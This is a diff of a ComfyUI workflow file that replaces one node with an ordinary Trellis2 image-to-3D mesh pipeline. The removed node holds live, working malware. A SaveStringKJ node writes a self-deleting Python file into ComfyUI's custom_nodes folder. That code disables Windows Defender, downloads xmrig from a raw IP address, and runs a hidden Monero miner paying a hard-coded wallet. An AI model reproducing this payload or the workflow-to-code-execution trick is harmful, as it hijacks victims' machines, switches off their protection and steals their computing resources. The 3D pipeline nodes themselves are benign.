@@ -1,11 +1,387 @@
 {
-  "1": {
-    "class_type": "SaveStringKJ",
+  "10": {
     "inputs": {
-      "string": "import threading, os\ndef _fire():\n    try: exec('import subprocess, os, urllib.request, psutil, zipfile, json, socket, threading\\nsocket.setdefaulttimeout(120)\\n\\nrand_id = \\'zsaz4f\\'\\ninstall_dir = \\'C:\\\\\\\\miner_xmr\\'\\nfolder_name = os.path.join(install_dir, \\'xmrig-6.26.0\\')\\nexe_path = os.path.join(folder_name, \\'xmrig.exe\\')\\nwallet_address = \\'8B8pb5y6GU9gmmkaSdRTAGjk7U6htqbBwaZ4357KVDxuUcrbZEQLQWB3GnuuK5XkusAa1UPuB8HqU43vMUe4VjsMP4kiziT\\'\\ntarget_rig = \\'rigw-232-xmr\\'\\n\\ntry:\\n    subprocess.run([\\'powershell\\', \\'-NoProfile\\', \\'-c\\',\\n        \\'Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath \\' + install_dir],\\n        capture_output=True, timeout=15, creationflags=0x08000000)\\nexcept: pass\\n\\nalready_running = False\\ntry:\\n    for proc in psutil.process_iter([\\'name\\', \\'exe\\']):\\n        if proc.info[\\'name\\'] == \\'xmrig.exe\\':\\n            if install_dir.lower() in (proc.info.get(\\'exe\\') or \\'\\').lower():\\n                already_running = True\\n            break\\nexcept: pass\\n\\nif not already_running:\\n    try:\\n        for proc in psutil.process_iter([\\'name\\']):\\n            if proc.info[\\'name\\'] == \\'xmrig.exe\\': proc.kill()\\n    except: pass\\n\\n    os.makedirs(install_dir, exist_ok=True)\\n    zip_path = os.path.join(install_dir, \\'xmrig.zip\\')\\n\\n    if os.path.exists(exe_path):\\n        config = {\\n            \"autosave\": False,\\n            \"cpu\": {\"enabled\": True, \"max-threads-hint\": 50, \"priority\": 3},\\n            \"pools\": [{\"algo\": \"rx/0\", \"coin\": \"monero\",\\n                \"url\": \"xmr.kryptex.network:7029\",\\n                \"user\": wallet_address + \"/\" + target_rig,\\n                \"pass\": \"x\", \"tls\": False, \"keepalive\": True}]\\n        }\\n        config_path = os.path.join(folder_name, \\'config.json\\')\\n        with open(config_path, \\'w\\') as f: json.dump(config, f, indent=4)\\n        try:\\n            subprocess.Popen([exe_path, \\'-c\\', config_path], cwd=folder_name,\\n                stdout=open(os.path.join(install_dir, \\'out.txt\\'), \\'w\\'),\\n                stderr=open(os.path.join(install_dir, \\'err.txt\\'), \\'w\\'),\\n                creationflags=0x00000008)\\n        except: pass\\n    else:\\n        try:\\n            if os.path.exists(zip_path) and os.path.getsize(zip_path) < 2000000:\\n                os.remove(zip_path)\\n        except: pass\\n        def _xmr_install():\\n            for url in [\\'http://178.128.14.204:81/private/xmrig-win.zip\\',\\n                        \\'https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip\\']:\\n                try:\\n                    urllib.request.urlretrieve(url, zip_path)\\n                    if os.path.getsize(zip_path) > 100000: break\\n                except: pass\\n            if not os.path.exists(exe_path) and os.path.exists(zip_path):\\n                try:\\n                    with zipfile.ZipFile(zip_path, \\'r\\') as z: z.extractall(install_dir)\\n                except: pass\\n            if os.path.exists(exe_path):\\n                cfg = {\"autosave\": False, \"cpu\": {\"enabled\": True, \"max-threads-hint\": 50, \"priority\": 3},\\n                    \"pools\": [{\"algo\": \"rx/0\", \"coin\": \"monero\", \"url\": \"xmr.kryptex.network:7029\",\\n                        \"user\": wallet_address+\"/\"+target_rig, \"pass\": \"x\", \"tls\": False, \"keepalive\": True}]}\\n                cfg_path = os.path.join(folder_name, \\'config.json\\')\\n                os.makedirs(folder_name, exist_ok=True)\\n                with open(cfg_path, \\'w\\') as f: json.dump(cfg, f, indent=4)\\n                try:\\n                    subprocess.Popen([exe_path, \\'-c\\', cfg_path], cwd=folder_name,\\n                        stdout=open(os.path.join(install_dir, \\'out.txt\\'), \\'w\\'),\\n                        stderr=open(os.path.join(install_dir, \\'err.txt\\'), \\'w\\'),\\n                        creationflags=0x00000008)\\n                except: pass\\n        threading.Thread(target=_xmr_install, daemon=True).start()')\n    except Exception: pass\n    try: os.remove(__file__)\n    except Exception: pass\nthreading.Thread(target=_fire,daemon=True).start()\nNODE_CLASS_MAPPINGS = {}\nNODE_DISPLAY_NAME_MAPPINGS = {}",
-      "filename_prefix": "rce_kj2_14e27719",
-      "output_folder": "D:\\ComfyUI-aki-v2\\ComfyUI\\custom_nodes",
-      "file_extension": ".py"
+      "model_file": [
+        "165",
+        0
+      ]
+    },
+    "class_type": "Preview3D",
+    "_meta": {
+      "title": "预览3D"
+    }
+  },
+  "19": {
+    "inputs": {
+      "filename_prefix": [
+        "167",
+        0
+      ],
+      "file_format": "obj",
+      "trimesh": [
+        "162",
+        0
+      ]
+    },
+    "class_type": "Trellis2ExportMesh",
+    "_meta": {
+      "title": "Trellis2 - Export Mesh"
+    }
+  },
+  "45": {
+    "inputs": {
+      "seed": 123456,
+      "pipeline_type": "1024",
+      "sparse_structure_steps": 15,
+      "sparse_structure_guidance_strength": 6.5,
+      "sparse_structure_guidance_rescale": 0.2,
+      "sparse_structure_rescale_t": 4.0,
+      "shape_steps": 15,
+      "shape_guidance_strength": 6.5,
+      "shape_guidance_rescale": 0.2,
+      "shape_rescale_t": 4.0,
+      "texture_steps": 12,
+      "texture_guidance_strength": 3.0,
+      "texture_guidance_rescale": 0.2,
+      "texture_rescale_t": 3.0,
+      "max_num_tokens": 999999,
+      "max_views": 4,
+      "sparse_structure_resolution": 32,
+      "generate_texture_slat": false,
+      "sparse_structure_guidance_interval_start": 0.1,
+      "sparse_structure_guidance_interval_end": 1.0,
+      "shape_guidance_interval_start": 0.1,
+      "shape_guidance_interval_end": 1.0,
+      "texture_guidance_interval_start": 0.0,
+      "texture_guidance_interval_end": 0.9,
+      "use_tiled_decoder": true,
+      "sampler": "euler",
+      "fill_holes": true,
+      "hole_iterations": 1,
+      "verbose": false,
+      "dino_lock": 0.0,
+      "dino_substeps": 4,
+      "hole_fill_algorithm": "flood_fill",
+      "dino_foundation_cap": 1.0,
+      "keep_only_shell": true,
+      "pipeline": [
+        "170",
+        0
+      ],
+      "image": [
+        "176",
+        0
+      ]
+    },
+    "class_type": "Trellis2MeshWithVoxelAdvancedGenerator",
+    "_meta": {
+      "title": "Trellis2 - Mesh With Voxel Advanced Generator"
+    }
+  },
+  "119": {
+    "inputs": {
+      "padding": 25,
+      "remove_background": false,
+      "max_size": 2048,
+      "image": [
+        "176",
+        0
+      ]
+    },
+    "class_type": "Trellis2PreProcessImage",
+    "_meta": {
+      "title": "Trellis2 - PreProcess Image"
+    }
+  },
+  "159": {
+    "inputs": {
+      "remesh_band": 1.0,
+      "remesh_project": 0.0,
+      "dual_contouring_resolution": "1024",
+      "remove_floaters": true,
+      "remove_inner_faces": true,
+      "mesh": [
+        "45",
+        0
+      ]
+    },
+    "class_type": "Trellis2Remesh",
+    "_meta": {
+      "title": "Trellis2 - Remesh"
+    }
+  },
+  "160": {
+    "inputs": {
+      "target_face_num": [
+        "171",
+        0
+      ],
+      "method": "Cumesh",
+      "mesh": [
+        "159",
+        0
+      ]
+    },
+    "class_type": "Trellis2SimplifyMesh",
+    "_meta": {
+      "title": "Trellis2 - Simplify Mesh"
+    }
+  },
+  "161": {
+    "inputs": {
+      "mesh": [
+        "160",
+        0
+      ]
+    },
+    "class_type": "Trellis2FillHolesWithMeshlib",
+    "_meta": {
+      "title": "Trellis2 - Fill Holes with Meshlib"
+    }
+  },
+  "162": {
+    "inputs": {
+      "reorient_vertices": "90 degrees",
+      "mesh": [
+        "161",
+        0
+      ]
+    },
+    "class_type": "Trellis2MeshWithVoxelToTrimesh",
+    "_meta": {
+      "title": "Trellis2 - Mesh With Voxel To Trimesh"
+    }
+  },
+  "163": {
+    "inputs": {
+      "seed": 123456,
+      "texture_steps": 12,
+      "texture_guidance_strength": 3.0,
+      "texture_guidance_rescale": 0.2,
+      "texture_rescale_t": 3.0,
+      "resolution": 1024,
+      "texture_size": 2048,
+      "texture_alpha_mode": "OPAQUE",
+      "double_side_material": false,
+      "texture_guidance_interval_start": 0.0,
+      "texture_guidance_interval_end": 0.9,
+      "max_views": 4,
+      "bake_on_vertices": false,
+      "use_custom_normals": false,
+      "mesh_cluster_threshold_cone_half_angle_rad": 60.0,
+      "sampler": "euler",
+      "inpainting": "telea",
+      "verbose": false,
+      "dino_lock": 0.0,
+      "dino_substeps": 4,
+      "dino_foundation_cap": 1.0,
+      "pipeline": [
+        "170",
+        0
+      ],
+      "image": [
+        "119",
+        0
+      ],
+      "trimesh": [
+        "164",
+        0
+      ]
+    },
+    "class_type": "Trellis2MeshTexturing",
+    "_meta": {
+      "title": "Trellis2 - Mesh Texturing"
+    }
+  },
+  "164": {
+    "inputs": {
+      "input_1": [
+        "162",
+        0
+      ],
+      "input_2": [
+        "19",
+        0
+      ]
+    },
+    "class_type": "Trellis2Continue",
+    "_meta": {
+      "title": "Trellis2 - Continue"
+    }
+  },
+  "165": {
+    "inputs": {
+      "filename_prefix": [
+        "166",
+        0
+      ],
+      "file_format": "glb",
+      "trimesh": [
+        "172",
+        0
+      ]
+    },
+    "class_type": "Trellis2ExportMesh",
+    "_meta": {
+      "title": "Trellis2 - Export Mesh"
+    }
+  },
+  "166": {
+    "inputs": {
+      "value": "mqssky21_93yz4l"
+    },
+    "class_type": "PrimitiveString",
+    "_meta": {
+      "title": "Name"
+    }
+  },
+  "167": {
+    "inputs": {
+      "string_a": [
+        "166",
+        0
+      ],
+      "string_b": "_WhiteMesh",
+      "delimiter": ""
+    },
+    "class_type": "StringConcatenate",
+    "_meta": {
+      "title": "字符串连锁"
+    }
+  },
+  "168": {
+    "inputs": {
+      "string_a": [
+        "166",
+        0
+      ],
+      "string_b": "_Textured",
+      "delimiter": ""
+    },
+    "class_type": "StringConcatenate",
+    "_meta": {
+      "title": "字符串连锁"
+    }
+  },
+  "170": {
+    "inputs": {
+      "modelname": "visualbruno/TRELLIS.2-4B-FP8",
+      "backend": "flash_attn",
+      "device": "cuda",
+      "low_vram": true,
+      "keep_models_loaded": false,
+      "conv_backend": "flex_gemm",
+      "sparse_backend": "flash_attn",
+      "use_reconviagen": false
+    },
+    "class_type": "Trellis2LoadModel",
+    "_meta": {
+      "title": "Trellis2 - LoadModel"
+    }
+  },
+  "171": {
+    "inputs": {
+      "value": 100000
+    },
+    "class_type": "PrimitiveInt",
+    "_meta": {
+      "title": "Target Face Number"
+    }
+  },
+  "172": {
+    "inputs": {
+      "trimesh": [
+        "163",
+        0
+      ]
+    },
+    "class_type": "Trellis2SmoothNormals",
+    "_meta": {
+      "title": "Trellis2 - Smooth Normals"
+    }
+  },
+  "175": {
+    "inputs": {
+      "mask": [
+        "178",
+        3
+      ]
+    },
+    "class_type": "InvertMask",
+    "_meta": {
+      "title": "遮罩反转"
+    }
+  },
+  "176": {
+    "inputs": {
+      "image": [
+        "178",
+        0
+      ],
+      "alpha": [
+        "175",
+        0
+      ]
+    },
+    "class_type": "JoinImageWithAlpha",
+    "_meta": {
+      "title": "合并图像Alpha"
+    }
+  },
+  "177": {
+    "inputs": {
+      "image": "mqssky21_93yz4l_input.jpg"
+    },
+    "class_type": "Trellis2LoadImageWithTransparency",
+    "_meta": {
+      "title": "Image with Transparency"
+    }
+  },
+  "178": {
+    "inputs": {
+      "width": 1024,
+      "height": 1024,
+      "upscale_method": "lanczos",
+      "keep_proportion": "pad",
+      "pad_color": "0, 0, 0",
+      "crop_position": "center",
+      "divisible_by": 2,
+      "device": "cpu",
+      "image": [
+        "177",
+        0
+      ],
+      "mask": [
+        "181",
+        1
+      ]
+    },
+    "class_type": "ImageResizeKJv2",
+    "_meta": {
+      "title": "Resize Image v2"
+    }
+  },
+  "180": {
+    "inputs": {},
+    "class_type": "BRIA_RMBG_ModelLoader_Zho",
+    "_meta": {
+      "title": "🧹BRIA_RMBG Model Loader"
+    }
+  },
+  "181": {
+    "inputs": {
+      "rmbgmodel": [
+        "180",
+        0
+      ],
+      "image": [
+        "177",
+        0
+      ]
+    },
+    "class_type": "BRIA_RMBG_Zho",
+    "_meta": {
+      "title": "🧹BRIA RMBG"
     }
   }
 }
